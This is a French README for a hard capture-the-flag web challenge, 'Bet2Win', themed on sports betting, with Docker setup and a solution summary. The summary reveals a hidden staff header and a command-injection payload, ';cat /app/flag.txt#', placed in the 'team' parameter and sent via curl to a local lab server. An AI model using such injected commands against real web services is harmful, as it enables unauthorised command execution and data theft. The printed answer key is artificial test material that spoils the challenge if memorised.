# 🏟️ Bet2Win – Web Challenge (Hard)

Un challenge web inspiré de l’univers des paris sportifs, avec une belle victoire du PSG 5-0 sur l’Inter Milan comme toile de fond 🏆  
Les joueurs devront faire preuve de curiosité, d’observation, et de maîtrise des commandes shell pour obtenir le flag.

---

## 🧩 Description (pour le portail CTF)

> Le PSG a explosé l’Inter Milan 5–0. Pour fêter ça, *Bet2Win* vous propose de miser grâce à une IA qui calcule les meilleures cotes automatiquement.
>
> Il paraît qu’il existe un accès spécial réservé aux membres du staff…
>
> Tentez de percer le système et d’obtenir le flag.
>
> 🔍 URL : http://bet2win.ctf.local:5000  
> 🕵️‍♂️ Catégorie : Web  
> 🧠 Difficulté : Hard  
> 🎯 Objectif : Trouver le flag

---

## 🛠️ Déploiement

### 🔧 Build Docker

```bash
docker build -t bet2win .
docker run --rm -p 5000:5000 --name bet2win_ctf bet2win
```


Solution (résumé)

    Les promo cachent un header. Trouve le.

    Envoie un header spécial X-BET-STAFF: 1 pour accéder à /staff et aux vraies cotes.

    La route /generate-odds appelle un script avec des paramètres non filtrés.

    Le paramètre team est vulnérable à une command injection.

    Injecte ;cat /app/flag.txt# pour exécuter une commande shell et lire le flag.

✅ Payload final
curl -H "X-BET-STAFF: 1" \
"http://localhost:5000/generate-odds?team=psg;cat%20/app/flag.txt%23&form=4-4-2"

